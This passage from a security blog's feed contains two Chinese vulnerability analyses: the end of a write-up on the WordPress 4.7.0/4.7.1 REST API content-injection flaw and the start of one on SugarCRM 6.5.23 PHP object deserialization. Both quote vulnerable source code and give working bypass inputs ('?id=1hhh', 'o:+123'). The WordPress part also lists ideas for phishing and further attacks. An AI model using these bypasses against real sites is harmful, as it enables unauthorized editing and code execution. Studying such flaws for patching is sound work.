id="WP-REST-API"><a href="#WP-REST-API" class="headerlink" title="WP REST API"></a>WP REST API</h2><p>首先来说一下<code>REST API</code>。</p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p><code>WP-API</code>中采用了控制器概念，为表示自愿端点的类提供了标准模式，所有资源端点都扩展<code>WP_REST_Controller</code>来保证其实现通用方法。</p><h3 id="五种请求"><a href="#五种请求" class="headerlink" title="五种请求"></a>五种请求</h3><p>之后，<code>WP-API</code>还有这么几种请求（也可以想成是功能吧）：</p><ul><li>HEAD</li><li>GET</li><li>POST</li><li>PUT</li><li>DELETE</li></ul><p>以上表示HTTP客户端可能对资源执行的操作类型。</p><h3 id="HTTP客户端"><a href="#HTTP客户端" class="headerlink" title="HTTP客户端"></a>HTTP客户端</h3><p>WordPress本身在<code>WP_HTTP</code>类和相关函数中提供了一个HTTP客户端。用于从另一个访问一个WordPress站点。</p><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>简单来说，就是文章，页面，评论等。</p><p><code>WP-API</code>允许HTTP客户端对资源执行CRUD操作（创建，读取，更新，删除，这边只展示和漏洞相关的部分）：</p><ul><li><p><code>GET /wp-json/wp/v2/posts</code>获取帖子的集合：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885475349.jpg" alt=""></p></li><li><p><code>GET /wp-json/wp/v2/posts/1</code>获取一个ID为1的单独的Post：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885751013.jpg" alt=""></p></li></ul><p>可以看到ID为1的文章标题为Hello World，包括文章的路由也有。</p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>路由是用于访问端点的“名称”，在URL中使用（在非法情况下可控，就像这个漏洞一样）。</p><p>例如，使用URL<code>http://example.com/wp-json/wp/v2/posts/123</code>:</p><ul><li>路由（route）是<code>wp/v2/posts/123</code>，不包括<code>wp-json</code>，因为<code>wp-json</code>是API本身的基本路径。</li><li>这个路由有三个端点：<ul><li>GET触发一个<code>get_item</code>方法，将post数据返回给客户端。</li><li>PUT触发一个<code>update_item</code>方法，使数据更新，并返回更新的发布数据。</li><li>DELETE触发<code>delete_item</code>方法，将现在删除的发布数据返回给客户端。</li></ul></li></ul><h2 id="静态追踪"><a href="#静态追踪" class="headerlink" title="静态追踪"></a>静态追踪</h2><p>知道了<code>WP-API</code>的路由信息以及其操作方式，可以根据其运行的思路来看一下具体实现的代码。</p><p>我们看一下<code>/wp-includes/rest-api/endpoints/class-wp-rest-post-controller.php</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885995846.jpg" alt=""></p><p>根据上面的信息，我们可以知道这是注册controller对象的路由，实现路由中端点方法。</p><p>在这里，如果我们向<code>/wp-json/wp/v2/posts/1</code>发送请求，则ID参数将被设置为1：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045886320123.jpg" alt=""></p><p>同时，注意一下这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">register_rest_route( <span class="keyword">$this</span>-&gt;namespace, <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;rest_base . <span class="string">'/(?P&lt;id&gt;[\d]+)'</span>, <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::READABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; $get_item_args,</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::EDITABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">$this</span>-&gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::DELETABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'force'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'type'</span>        =&gt; <span class="string">'boolean'</span>,</span><br><span class="line"><span class="string">'default'</span>     =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="string">'description'</span> =&gt; __( <span class="string">'Whether to bypass trash and force deletion.'</span> ),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line"><span class="string">'schema'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_public_item_schema'</span> ),</span><br><span class="line">) );</span><br></pre></td></tr></table></figure><p>可以看到在<code>register_rest_route</code>中对路由进行了正则限制：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045886830428.jpg" alt=""></p><p>也就是防止攻击者恶意构造ID值，但是我们可以发现<code>$_GET</code>和<code>$_POST</code>值优先于路由正则表达式生成的值：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887045836.jpg" alt=""></p><p>这边没有找到ID为<code>123hh</code>的项目，所以返回<code>rest_invalid</code>。</p><p>现在我们可以忽略路由正则的限制，来传入我们自定义的ID。</p><p>接下来在审查各个端点方法中，找到了<code>update_item</code>这个方法，及其权限检查方法<code>update_item_permissions_check</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item_permissions_check</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">$post = get_post( $request[<span class="string">'id'</span>] );</span><br><span class="line">$post_type = get_post_type_object( <span class="keyword">$this</span>-&gt;post_type );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post &amp;&amp; ! <span class="keyword">$this</span>-&gt;check_update_permission( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit'</span>, __( <span class="string">'Sorry, you are not allowed to edit this post.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'author'</span>] ) &amp;&amp; get_current_user_id() !== $request[<span class="string">'author'</span>] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit_others'</span>, __( <span class="string">'Sorry, you are not allowed to update posts as this user.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'sticky'</span>] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_sticky'</span>, __( <span class="string">'Sorry, you are not allowed to make posts sticky.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;check_assign_terms_permission( $request ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_term'</span>, __( <span class="string">'Sorry, you are not allowed to assign the provided terms.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，此函数通过检查文章是否实际存在，以及我们的用户是否有权限编辑这边文章来验证请求。但是当我们发送一个没有响应文章的ID时，就可以通过权限检查，并允许继续执行对<code>update_item</code>方法的请求。</p><p>具体到代码，就是让<code>$post</code>为空，就可以通过权限检查，接下来跟进<code>get_post</code>方法中看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_post</span><span class="params">( $post = null, $output = OBJECT, $filter = <span class="string">'raw'</span> )</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post ) &amp;&amp; <span class="keyword">isset</span>( $GLOBALS[<span class="string">'post'</span>] ) )</span><br><span class="line">$post = $GLOBALS[<span class="string">'post'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post <span class="keyword">instanceof</span> WP_Post ) &#123;</span><br><span class="line">$_post = $post;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( is_object( $post ) ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post-&gt;filter ) ) &#123;</span><br><span class="line">$_post = sanitize_post( $post, <span class="string">'raw'</span> );</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $_post );</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="string">'raw'</span> == $post-&gt;filter ) &#123;</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $post );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post-&gt;ID );</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! $_post )</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，它是用<code>wp_posts</code>中的<code>get_instance</code>静态方法来获取文章的，跟进<code>wp_posts</code>类，位于<code>/wp-includes/class-wp-post.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_instance</span><span class="params">( $post_id )</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $wpdb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当我们传入的ID不是全由数字字符组成的时候，就会返回false，也就是返回一个不存在的文章。从而<code>get_post</code>方法返回null，从而绕过<code>update_item_permissions_check</code>的权限检测。</p><p>回头再看一下可执行方法<code>upload_item</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line">$id   = (int) $request[<span class="string">'id'</span>];</span><br><span class="line">$post = get_post( $id );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $id ) || <span class="keyword">empty</span>( $post-&gt;ID ) || <span class="keyword">$this</span>-&gt;post_type !== $post-&gt;post_type ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_post_invalid_id'</span>, __( <span class="string">'Invalid post ID.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; <span class="number">404</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$post = <span class="keyword">$this</span>-&gt;prepare_item_for_database( $request );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// convert the post object to an array, otherwise wp_update_post will expect non-escaped input.</span></span><br><span class="line">$post_id = wp_update_post( wp_slash( (<span class="keyword">array</span>) $post ), <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure><p>在这边将ID参数装换为一个整数，然后传递给<code>get_post</code>。而PHP类型转换的时候回出现这样的情况：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887374640.jpg" alt=""></p><p>所以，也就是说，当攻击者发起<code>/wp-json/wp/v2/posts/1?id=1hhh</code>请求时，便是发起了对ID为1的文章的请求。下面为利用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">exploit-db</a>上的POC来进行测试：</p><ul><li><p>新建文章：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887686508.jpg" alt=""></p></li><li><p>测试：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887924832.jpg" alt=""></p></li><li><p>测试结果：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045888358058.jpg" alt=""></p></li></ul><h2 id="多想了一下"><a href="#多想了一下" class="headerlink" title="多想了一下"></a>多想了一下</h2><p>乍一看，感觉这个洞并没有什么太大的影响，但是仔细想了一下，危害还是很大的。先不说WordPress页面执行php代码的各种插件，还有相当一部分的WordPress文章可以调用短代码的方式来输出特定的内容，以及向日志中添加内容，这是一个思路。</p><p>另一个思路就是可以进行对原来文章中的指定超链接进行修改，从而进行钓鱼。</p><p>还有一个思路，就是利用WordPress文章中解析html以及JavaScript文件包含的做法，辅助其他方法，进行攻击。</p><h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p>对于该漏洞，关键的修改在<code>/wp-includes/class-wp-post.php</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045888551118.jpg" alt=""></p><p>更改了对于<code>$post_id</code>的参数的传入顺序和判断条件，防止了我们传入数字+字母这样的格式进行绕过。</p><h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>将WordPress更新到最新版本。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简述&quot;&gt;&lt;/a&gt;0x00 漏洞简述&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞简介&quot;&gt;&lt;/a&gt;1. 漏洞简介&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;REST API&lt;/code&gt;自动包含在&lt;code&gt;Wordpress4.7&lt;/code&gt;以上的版本，&lt;code&gt;WordPress REST API&lt;/code&gt;提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由&lt;code&gt;REST API&lt;/code&gt;引起的影响&lt;code&gt;WorePress4.7.0&lt;/code&gt;和&lt;code&gt;4.7.1&lt;/code&gt;版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞影响版本&quot;&gt;&lt;a href=&quot;#2-漏洞影响版本&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞影响版本&quot;&gt;&lt;/a&gt;2. 漏洞影响版本&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;WordPress4.7.0&lt;/li&gt;
&lt;li&gt;WordPress4.7.1&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</title>
    <link href="https://lucifaer.com/2017/01/18/SugarCRM%20v6.5.23%20PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/</id>
    <published>2017-01-17T16:23:44.000Z</published>
    <updated>2018-08-09T02:20:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>免费广告…..推荐使用<code>PHPSTORM+Xdebug</code>来分析漏洞，下面的过程都是利用<code>PHPSTORM</code>来分析的。</p><a id="more"></a><p>这个是个去年的洞，当时出了的时候就仔细看了一下<code>CVE-2016-7124</code>（后面的班级对抗赛还出了一个关于这个漏洞的题），但是没有仔细的分析过在<code>SugarCRM</code>中的触发过程，或许是当时有点忙吧，或许是自己从404回来后缺乏了及时分析漏洞的氛围，整天忙于较为鸡肋课业，导致昏昏沉沉的荒废了一个学期。寒假的时候突然想着把那些没有分析过的漏洞再分析一遍，算是弥补遗憾吧。</p><p>就像上面说的，这洞是去年九月份爆出来的，正规的分析文档可以看<a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">由创宇小伙伴写的漏洞分析文档</a>。我下面写的是我个人对于这个漏洞的一点分析过程，主要是从漏洞挖掘和漏洞分析来看一下这个洞。</p><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>SugarCRM是一套开源的客户关系管理系统。在<code>&lt;6.5.23</code>版本中存在反序列化漏洞，攻击者可以通过构造恶意序列化数据，达到任意代码执行的目的。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>SugarCRM &lt;= 6.5.23<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">Dockerfile</a>看小伙伴的吧，拖到<code>phpstudy</code>里也行= =。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="找到可控点"><a href="#找到可控点" class="headerlink" title="找到可控点"></a>找到可控点</h2><p>首先在<code>service/core/REST/SugarRestSerialize.php</code>中的<code>serve</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line">$data = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'rest_data'</span>])? $_REQUEST[<span class="string">'rest_data'</span>]: <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_REQUEST[<span class="string">'method'</span>]) || !method_exists(<span class="keyword">$this</span>-&gt;implementation, $_REQUEST[<span class="string">'method'</span>]))&#123;</span><br><span class="line">$er = <span class="keyword">new</span> SoapError();</span><br><span class="line">$er-&gt;set_error(<span class="string">'invalid_call'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;fault($er);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$method = $_REQUEST[<span class="string">'method'</span>];</span><br><span class="line">$data = sugar_unserialize(from_html($data));</span><br><span class="line"><span class="keyword">if</span>(!is_array($data))$data = <span class="keyword">array</span>($data);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">array</span>( <span class="keyword">$this</span>-&gt;implementation, $method),$data);</span><br><span class="line">&#125; <span class="comment">// else</span></span><br><span class="line">&#125; <span class="comment">// fn</span></span><br></pre></td></tr></table></figure><p>在<code>$data = !empty($_REQUEST[&#39;rest_data&#39;])? $_REQUEST[&#39;rest_data&#39;]: &#39;&#39;;</code>传入可控参数，代码写的很简单，在传入<code>sugar_unserialize</code>方法前，首先将传入参数传入<code>from_html</code>方法中，而这个方法是用来进行编码转换的，可以看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">from_html</span><span class="params">($string, $encode=true)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string($string) || !$encode) &#123;</span><br><span class="line">        <span class="keyword">return</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $toHTML;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_values = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_keys = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $cache = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($toHTML) &amp;&amp; is_array($toHTML) &amp;&amp; (!<span class="keyword">isset</span>($toHTML_values) || !<span class="keyword">empty</span>($GLOBALS[<span class="string">'from_html_cache_clear'</span>]))) &#123;</span><br><span class="line">        $toHTML_values = array_values($toHTML);</span><br><span class="line">        $toHTML_keys = array_keys($toHTML);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bug 36261 - Decode &amp;amp; so we can handle double encoded entities</span></span><br><span class="line">$string = str_ireplace(<span class="string">"&amp;amp;"</span>, <span class="string">"&amp;"</span>, $string);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($cache[$string])) &#123;</span><br><span class="line">        $cache[$string] = str_ireplace($toHTML_values, $toHTML_keys, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cache[$string];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>小窍门，对于这样的方法，其实可以往上面翻一翻，看一看关于这个方法的注释….额，就是这样，直接过….</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces specific HTML entity values with the true characters</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $string String to check/replace</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $encode Default true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>重点看一下<code>sugar_unserialize</code>方法，<code>PHPSTORM</code>的话，直接圈住这个方法名，<code>Command+B</code>就跳转到该方法了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Performs unserialization. Accepts all types except Objects</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $value Serialized value of any type except Object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed False if Object, converted value for other cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value, $matches);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到注释中写到的是，（翻译）<code>执行反序列化。接受除对象外的所有类型</code>，读一下正则，可以看到只是过滤了<code>o:123</code>这样的形式，但是并没有过滤完整，可以通过<code>o:+123123</code>的方式绕过（<a href="http://139.129.31.35/index.php/archives/382/" target="_blank" rel="noopener">以前php4fun做过一道类似的</a>）</p><p>不难发现，如果我们想要利用这个漏洞，需要传入<code>rest_data</code>，<code>method</code>。<code>serve</code>函数的作用就是在实施代码的类中调用指定的方法，并且返回结果。</p><p>顺着这个思路找一下哪里调用我们的<code>serve</code>方法。这个时候看一下目录结构，发现我们找到的漏洞触发点在<code>/service/core/REST</code>目录下：<img src="media/14858321993840/1.png" 